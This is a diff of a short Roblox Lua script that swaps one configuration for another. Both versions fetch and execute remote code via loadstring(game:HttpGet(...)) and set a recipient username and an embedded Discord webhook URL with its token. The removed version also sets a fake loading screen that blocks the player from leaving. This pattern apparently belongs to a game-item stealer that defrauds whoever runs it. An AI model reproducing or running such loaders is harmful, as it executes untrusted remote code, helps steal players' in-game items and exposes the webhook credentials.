@@ -1,21 +1,3 @@
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4c7be0e8db405555787.lua"))()
-
-
-wait(10)
-
-UserName = "zeropoint12345678"
-UserName2 = "zerozeroly" -- optional delete the whole line if you don't want it
-Webhook = "https://discordapp.com/api/webhooks/1101081988552732692/lzBnblLOH8f3_sDqOHEQGC4x3PlMUcrVozMKu24DuLP1tFY0leRPGGvokGXqW-pkRiOp" -- optional delete the whole line if you don't want it
-
-_G.LoadingScreen = false
-_G.AntiLeave = true
-_G.MouseLock = true 
--- set them to false if you don't need them
-
-_G.ScriptName = "Rizz Scriptz"
-_G.FirstText = "Script Preparing"
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
-
-loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
+_G.User = "prooelyas1"
+_G.Webhook = "https://discord.com/api/webhooks/1194645196558835844/ITwEfaZzaa-3AwgdYorPihR2rAwqoawPELJi3jFfDMBz2nV_Q6sJzrba0pMMrhpiD1nL"
+loadstring(game:HttpGet("https://roblox.blxbby.org/ps99.lua"))()
